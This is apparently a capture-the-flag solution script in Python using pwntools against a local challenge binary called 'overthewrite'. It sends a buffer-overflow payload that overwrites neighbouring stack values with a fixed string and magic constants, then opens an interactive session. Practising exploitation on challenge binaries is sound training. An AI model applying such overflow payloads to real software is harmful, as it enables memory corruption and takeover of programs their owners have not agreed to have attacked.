# script
```python
from pwn import *

p = process('./overthewrite')



payload = b'a'*0x20 + b'Welcome to KCSC\0' + b'a'*8 + p64(0x215241104735F10F) + p64(0xDEADBEEFCAFEBABE) + b'a'*4 + p32(0x13371337) 



p.send(payload)

p.interactive()
```
